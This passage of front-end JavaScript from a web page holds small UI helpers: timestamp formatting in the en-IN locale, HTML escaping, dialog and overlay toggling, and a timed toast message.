  if (!t) return '';
  try {
    var d = typeof t === 'number' ? (t > 1e10 ? new Date(t) : new Date(t * 1000)) : new Date(t);
    if (isNaN(d.getTime())) return String(t);
    return d.toLocaleString('en-IN', {
      day: '2-digit', month: '2-digit', year: 'numeric',
      hour: '2-digit', minute: '2-digit', second: '2-digit'
    });
  } catch(e) { return String(t); }
}

function escapeHtml(s) {
  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

function openDialog(id) {
  document.getElementById(id).style.display = 'flex';
}

function closeDialog(id) {
  document.getElementById(id).style.display = 'none';
}

var overlays = document.querySelectorAll('.overlay');
for (var i = 0; i < overlays.length; i++) {
  overlays[i].addEventListener('click', function(e) {
    if (e.target === this) this.style.display = 'none';
  });
}

function showToast(msg) {
  var toast = document.getElementById('toast');
  toast.textContent = msg;
  toast.style.opacity = '1';
  clearTimeout(toastTimer);
  toastTimer = setTimeout(function() { toast.style.opacity = '0'; }, 3000);
}
</script>
